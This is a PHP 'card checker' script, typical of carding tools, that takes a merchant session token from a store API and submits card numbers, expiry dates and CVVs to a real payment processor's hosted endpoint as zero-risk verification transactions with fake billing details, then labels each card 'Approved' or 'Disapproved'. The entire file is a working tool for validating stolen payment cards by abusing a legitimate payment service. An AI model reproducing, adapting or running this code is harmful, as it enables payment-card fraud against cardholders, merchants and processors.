<?php
error_reporting(0);

# # # # # # # # # # # # # # #  FUNCTIONS, DEFINITIONS  # # # # # # # # # # # # # # 

include('function.php');

# # # # # # # # # # # # # # # # # # #  CURL  # # # # # # # # # # # # # # # # # # #

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://cons-api.nrsplus.com/123/payments/token');
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, ''.$user_agent.'');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                                                'nrs-platform: web',
                                                'nrs-session: web-27e6ce6717f048ad41cbe091acb511e7',
                                                'nrs-store-id: 29746'
                                                                                ));
    curl_setopt($ch, CURLOPT_POSTFIELDS, '');
    $card = curl_exec($ch);
    $token = getStr($card, '"token":"','"');

        $ch = curl_init();
$ch = curl_init('https://www.convergepay.com/hosted-payments/service/payment/hpe/process/');
$http_headers = array(
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36', // Any User-Agent will do here
);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $http_headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                                                'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
                                                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                                                'Connection: keep-alive '
                                                                                ));
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"fields":{"ssl_transaction_type":"ccverify","ssl_salestax":"0","ssl_first_name":"MAR","ssl_last_name":"KO","ssl_company":"SADA","ssl_avs_address":"11 3rd St","ssl_address2":"APT, SUITE, BLDG. (OPTIONAL...","ssl_city":"Newark","ssl_state":"NJ","ssl_avs_zip":"07107","ssl_country":"US","ssl_email":"deoei6@gmail.com","ssl_phone":"2342424243","ssl_verify":"Y","ssl_invoice_number":100254,"ssl_amount":15,"ssl_card_number":"'.$cc.'","ssl_exp_date":"'.$mes.''.$ano1.'","ssl_cvv2cvc2":"'.$cvv.'","ssl_txn_auth_token":"'.$token.'"}}');
    $card = curl_exec($ch);

# # # # # # # # # # # # # # # # #  AUTO-MESSAGE  # # # # # # # # # # # # # # # # #
    $err = getStr($card, '"ssl_result_message":"','"');

# # # # # # # # # # # # # # # # # #  RESPONSE  # # # # # # # # # # # # # # # # # #

if(!$card){die("<font size=2 color='white'><font class='badge badge-danger'>Disapproved <i class='zmdi zmdi-close'></i></font> $lista <font class='badge badge-danger'>Connection Failure</font><br>"); }

else if(strpos($card, '"M"')) {
    echo "<font size=2 color='white'><font class='badge badge-success'>Approved  <i class='zmdi zmdi-check'></i></font> $lista <font size=2 color='white'><font class='badge badge-success'>CVV: Matched $err 🍌 </i></font><br>"; }

else if(strpos($card, 'APPROVAL')) {
echo "<font size=2 color='white'><font class='badge badge-success'>Approved  <i class='zmdi zmdi-check'></i></font> $lista <font size=2 color='white'><font class='badge badge-success'>CVV: Matched $err 🍌 </i></font><br>"; }

else if(strpos($card, 'error":true')) {
  echo "<font size=2 color='white'><font class='badge badge-primary'>CVV2 Disapproved <i class='zmdi zmdi-close-circle'></i></font> $lista <br>"; }

else if(strpos($card, 'sadsad')) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Disapprovedd <i class='zmdi zmdi-close'></i></font> $lista <font class='badge badge-danger'>$err 🍆 </font><br>"; }

else {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Disapproved <i class='zmdi zmdi-close'></i></font> $lista <font class='badge badge-danger'>$err 🍆 </font><br>"; }

# # # # # # # # # # # # # # # # # #  CLOSING  # # # # # # # # # # # # # # # # # #
 
curl_close($ch);
unlink('cookie.txt');
flush();
ob_flush();
?>
